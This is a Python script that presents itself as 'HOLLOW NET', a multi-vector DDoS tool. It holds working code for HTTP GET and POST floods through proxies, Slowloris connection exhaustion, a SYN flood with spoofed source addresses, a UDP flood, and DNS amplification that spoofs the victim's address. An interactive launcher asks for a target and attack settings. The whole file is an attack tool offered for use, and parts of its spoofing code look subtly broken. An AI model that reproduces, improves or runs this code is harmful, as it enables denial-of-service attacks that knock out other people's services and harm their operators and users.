#!/usr/bin/env python3
"""
HOLLOW NET - Advanced Multi-Vector DDoS Tool
Capable of:
  - HTTP/HTTPS GET/POST flood (Layer 7)
  - Slowloris (connection exhaustion)
  - SYN flood (requires raw socket privileges)
  - UDP flood
  - DNS amplification (basic)
  - Proxy support for HTTP attacks
  - Randomized headers and payloads
  - Automatic thread scaling
  - Multi-target capability

Usage: sudo python3 hollow_net.py <config_section>
       (or without sudo for Layer7 only)

Interactive mode available if no arguments.
"""

import sys
import os
import time
import socket
import struct
import random
import threading
import http.client
import ssl
import urllib.request
import urllib.parse
from queue import Queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from itertools import cycle

# ---------- Attack Vectors ----------
class HollowNet:
    def __init__(self):
        self.running = True
        self.target_ip = None
        self.target_port = 80
        self.threads = 500
        self.duration = 60
        self.method = "http-get"
        self.proxy_list = []
        self.useragents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/118.0"
        ]
        self.referers = ["https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/"]
        self.packet_size = 1024

    # ---------- HTTP GET FLOOD ----------
    def _http_get_flood(self, url):
        opener = urllib.request.build_opener()
        while self.running:
            try:
                req = urllib.request.Request(url)
                req.add_header("User-Agent", random.choice(self.useragents))
                req.add_header("Accept", "*/*")
                req.add_header("Accept-Language", "en-US,en;q=0.9")
                req.add_header("Connection", "keep-alive")
                req.add_header("Referer", random.choice(self.referers))
                if self.proxy_list:
                    proxy = random.choice(self.proxy_list)
                    req.set_proxy(proxy, "http")
                opener.open(req, timeout=5)
            except:
                pass

    # ---------- HTTP POST FLOOD ----------
    def _http_post_flood(self, url):
        while self.running:
            try:
                data = urllib.parse.urlencode({"data": os.urandom(512).hex()}).encode()
                req = urllib.request.Request(url, data=data)
                req.add_header("User-Agent", random.choice(self.useragents))
                req.add_header("Content-Type", "application/x-www-form-urlencoded")
                if self.proxy_list:
                    proxy = random.choice(self.proxy_list)
                    req.set_proxy(proxy, "http")
                urllib.request.urlopen(req, timeout=5)
            except:
                pass

    # ---------- Slowloris (connection exhaustion) ----------
    def _slowloris(self, host, port=80, https=False):
        sockets_pool = []
        def init_socket():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                if https:
                    context = ssl.create_default_context()
                    s = context.wrap_socket(s, server_hostname=host)
                s.connect((host, port))
                s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode("utf-8"))
                s.send(f"Host: {host}\r\n".encode("utf-8"))
                s.send("User-Agent: {}\r\n".format(random.choice(self.useragents)).encode("utf-8"))
                s.send("Accept-language: en-US,en;q=0.5\r\n".encode("utf-8"))
                return s
            except:
                return None
        # Build initial connection pool
        for _ in range(min(200, self.threads)):
            s = init_socket()
            if s:
                sockets_pool.append(s)
        # Keep connections alive by sending incomplete headers
        while self.running:
            for i, s in enumerate(sockets_pool):
                try:
                    s.send(f"X-a: {random.randint(1000,9999)}\r\n".encode("utf-8"))
                except:
                    sockets_pool[i] = init_socket()
            time.sleep(15)  # slow send interval

    # ---------- SYN FLOOD (requires raw socket, root) ----------
    def _syn_flood(self, ip, port):
        # Raw socket creation
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print("[!] SYN flood requires root privileges. Skipping.")
            return
        while self.running:
            try:
                src_ip = ".".join(map(str, (random.randint(1,254) for _ in range(4))))
                src_port = random.randint(1024,65535)
                seq = random.randint(0,4294967295)
                window = socket.htons(5840)
                # IP header
                ip_hdr = struct.pack("!BBHHHBBH4s4s",
                    0x45, 0, 40, random.randint(0,65535), 0, 64, socket.IPPROTO_TCP, 0,
                    socket.inet_aton(src_ip), socket.inet_aton(ip))
                # TCP header
                tcp_hdr = struct.pack("!HHLLBBHHH",
                    src_port, port, seq, 0, 0x50, 0x02, window, 0, 0)  # SYN flag
                packet = ip_hdr + tcp_hdr
                sock.sendto(packet, (ip, 0))
            except:
                pass

    # ---------- UDP FLOOD ----------
    def _udp_flood(self, ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        except:
            return
        while self.running:
            try:
                sock.sendto(os.urandom(self.packet_size), (ip, port))
            except:
                pass

    # ---------- DNS AMPLIFICATION (basic) ----------
    def _dns_amp(self, target_ip, dns_resolver="8.8.8.8", query_domain="isc.org"):
        # Craft a DNS query for ANY record
        query = bytearray()
        query.extend(b'\xaa\xbb\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00')  # ID, flags, query count
        for part in query_domain.encode().split(b'.'):
            query.extend(bytes([len(part)]))
            query.extend(part)
        query.extend(b'\x00')  # end of domain
        query.extend(b'\x00\xff\x00\x01')  # type=ANY, class=IN
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while self.running:
            try:
                # Spoof source IP to target
                packet = struct.pack("!BBHHHBBH4s4s",
                    0x45,0,20+len(query),random.randint(0,65535),0,64,socket.IPPROTO_UDP,0,
                    socket.inet_aton(target_ip), socket.inet_aton(dns_resolver))
                udp_hdr = struct.pack("!HHHH", random.randint(1024,65535), 53, 8+len(query), 0)
                packet = packet + udp_hdr + query
                sock.sendto(packet, (dns_resolver, 53))
            except:
                pass

    # ---------- PROXY LOADER ----------
    def load_proxies(self, file_path):
        try:
            with open(file_path, 'r') as f:
                self.proxy_list = [line.strip() for line in f if line.strip()]
            print(f"[+] Loaded {len(self.proxy_list)} proxies.")
        except Exception as e:
            print(f"[!] Proxy file error: {e}")

    # ---------- LAUNCHER ----------
    def start_attack(self):
        print(f"[HOLLOW NET] Starting {self.method} attack on {self.target_ip}:{self.target_port}")
        print(f"             Threads: {self.threads} | Duration: {self.duration}s")

        # Resolve hostname to IP if needed
        if self.method in ["syn-flood", "udp-flood", "dns-amp"]:
            try:
                self.target_ip = socket.gethostbyname(self.target_ip)
            except:
                pass

        # Create thread pool
        executor = ThreadPoolExecutor(max_workers=self.threads)
        futures = []
        start_time = time.time()

        # Dispatch based on method
        if self.method == "http-get":
            url = f"http://{self.target_ip}:{self.target_port}/"
            for _ in range(self.threads):
                futures.append(executor.submit(self._http_get_flood, url))
        elif self.method == "http-post":
            url = f"http://{self.target_ip}:{self.target_port}/"
            for _ in range(self.threads):
                futures.append(executor.submit(self._http_post_flood, url))
        elif self.method == "slowloris":
            # slowloris runs in a single thread managing connections
            t = threading.Thread(target=self._slowloris, args=(self.target_ip, self.target_port, False))
            t.daemon = True
            t.start()
            futures.append(t)
        elif self.method == "syn-flood":
            for _ in range(self.threads):
                futures.append(executor.submit(self._syn_flood, self.target_ip, self.target_port))
        elif self.method == "udp-flood":
            for _ in range(self.threads):
                futures.append(executor.submit(self._udp_flood, self.target_ip, self.target_port))
        elif self.method == "dns-amp":
            for _ in range(self.threads):
                futures.append(executor.submit(self._dns_amp, self.target_ip))
        else:
            print("[!] Unknown method.")
            return

        # Run for duration
        time.sleep(self.duration)
        self.running = False
        executor.shutdown(wait=False)
        print("[HOLLOW NET] Attack finished.")

# ---------- MAIN / CONFIG ----------
if __name__ == "__main__":
    net = HollowNet()

    if len(sys.argv) < 2:
        print("HOLLOW NET - Advanced DDoS Tool")
        print("Interactive mode: answer prompts or pass config file.")
        target = input("Target (IP/domain): ")
        port = input("Port (default 80): ") or "80"
        threads = input("Threads (default 500): ") or "500"
        duration = input("Duration (seconds): ") or "60"
        method = input("Method [http-get/http-post/slowloris/syn-flood/udp-flood/dns-amp]: ")
        proxy_file = input("Proxy list file (optional): ")
    else:
        config = sys.argv[1]
        if config == "--help":
            print("Usage: sudo python3 hollow_net.py [interactive]")
            print("       Or place settings in args: target port threads duration method [proxies.txt]")
            sys.exit(0)
        parts = sys.argv[1:]
        target = parts[0] if len(parts) > 0 else input("Target: ")
        port = parts[1] if len(parts) > 1 else "80"
        threads = parts[2] if len(parts) > 2 else "500"
        duration = parts[3] if len(parts) > 3 else "60"
        method = parts[4] if len(parts) > 4 else "http-get"
        proxy_file = parts[5] if len(parts) > 5 else None

    # Apply settings
    net.target_ip = target
    try:
        net.target_port = int(port)
    except:
        net.target_port = 80
    try:
        net.threads = int(threads)
    except:
        net.threads = 500
    try:
        net.duration = int(duration)
    except:
        net.duration = 60
    net.method = method.lower()

    if proxy_file and os.path.exists(proxy_file):
        net.load_proxies(proxy_file)

    net.start_attack()
